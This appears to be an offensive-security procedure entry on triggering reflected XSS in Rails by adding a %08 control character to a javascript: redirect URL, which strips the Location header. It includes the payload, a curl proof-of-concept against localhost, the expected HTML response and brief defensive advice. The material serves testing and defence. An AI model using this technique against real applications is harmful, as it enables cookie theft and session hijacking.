---
id: proc-rails-craft-request
tags:
  - xss
  - redirect
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-rails-redirect-poc]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:27.887Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Send-Crafted-Redirect-Request

## Summary

This procedure crafts and sends a request to a vulnerable Rails endpoint with a JavaScript URI payload appended with %08 to strip the Location header, forcing a fallback HTML response vulnerable to XSS.

## Description

By injecting control characters into the redirect_url, Rack linters enforce RFC7230 by removing the invalid Location header, causing Rails to return HTML with a clickable link containing the payload. This enables reflected XSS when the victim clicks. Tested on Rails 7.0.4.3 with Puma; requires the vulnerable app running.

## Requirements

1. Vulnerable Rails app running on localhost:3000
2. Access to send HTTP requests (browser or curl)
3. Knowledge of JS payloads for exploitation

## Defense

Defensive measures and detection strategies:

- Sanitize redirect parameters to block control characters
- Log and alert on redirect attempts with invalid URLs
- Use Content-Security-Policy to block javascript: URIs

## Objectives

1. Trigger header stripping via control character
2. Receive fallback HTML with controlled href
3. Set up for XSS execution

## Instructions

### Step 1: Prepare the Payload

**Context**: Construct the redirect_url with JS payload and %08 backspace.

The payload: `javascript:alert(document.cookie)%08`

> %08 is a backspace control character that invalidates the URL per RFC7230.

### Step 2: Send the Request

**Context**: Use curl or browser to hit the endpoint.

Execute [[commands/curl-rails-redirect-poc]]:

```bash
curl -v "http://localhost:3000/vuln?redirect_url=javascript:alert(document.cookie)%08"
```

> Sends GET request; -v shows headers. Expect 302 without Location.

### Step 3: Verify Response

**Context**: Check for missing Location and HTML body.

Inspect output for:

```html
<html><body>You are being <a href="javascript:alert(document.cookie) ">redirected</a>.</body></html>
```

> Confirms vulnerability; href is partially cleaned but clickable.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/curl-rails-redirect-poc]]

## Tools Used


## Tags

- xss
- redirect
- injection
